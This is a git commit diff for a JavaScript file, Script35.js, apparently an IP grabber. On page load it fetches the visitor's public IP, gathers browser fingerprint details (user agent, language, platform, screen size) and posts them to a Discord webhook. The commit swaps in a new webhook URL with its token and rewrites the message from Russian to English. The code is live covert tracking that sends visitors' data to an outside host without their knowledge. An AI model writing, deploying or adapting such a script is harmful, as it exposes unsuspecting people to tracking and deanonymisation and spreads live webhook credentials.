fd20a1528bfa189f4baa1d2f16d4434db3c6c4e7
ZOV-CHEAT <antibrainrotkid@gmail.com>
2025-11-30 19:52:43 +0300

    Update Script35.js

--- Script35.js
+++ Script35.js
@@ -1,21 +1,14 @@
 fetch('https://api.ipify.org')
 .then(response => response.text())
 .then(ip => {
-    fetch('https://discord.com/api/webhooks/1444260678516084748/E5DuzaYB5YZ3BUh1C_02a1KVp5xLnLlobI30dV6GDuMpPUTCYlJPERGOMT83GCvnq71Q', {
+    fetch('https://discord.com/api/webhooks/1425143787747020873/Z0FpN8ORcAYSQPdW1ol91L89cLRQgR-Jr4tkG4bCe88O0frYcK_sSgBuSaeIZnDYSneo', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({
             embeds: [{
-                title: "🌐 Информация о пользователе",
-                fields: [
-                    { name: "📱 User Agent", value: navigator.userAgent, inline: false },
-                    { name: "🗣️ Язык", value: navigator.language, inline: true },
-                    { name: "🌍 Языки", value: navigator.languages.join(', '), inline: true },
-                    { name: "🔌 Плагины", value: [...navigator.plugins].map(p => p.name).join(', ') || 'Нет', inline: false },
-                    { name: "📺 Размер экрана", value: `${screen.width} x ${screen.height}`, inline: true },
-                    { name: "🆔 IP адрес", value: ip || "Неизвестно", inline: true }
-                ],
-                timestamp: new Date().toISOString()
+                title: "VISITOR INFO",
+                description: "IP: " + ip + "\nUser Agent: " + navigator.userAgent + "\nLanguage: " + navigator.language + "\nPlatform: " + navigator.platform + "\nCookies: " + navigator.cookieEnabled + "\nScreen: " + screen.width + 'x' + screen.height,
+                color: 0xff00
             }]
         })
     });
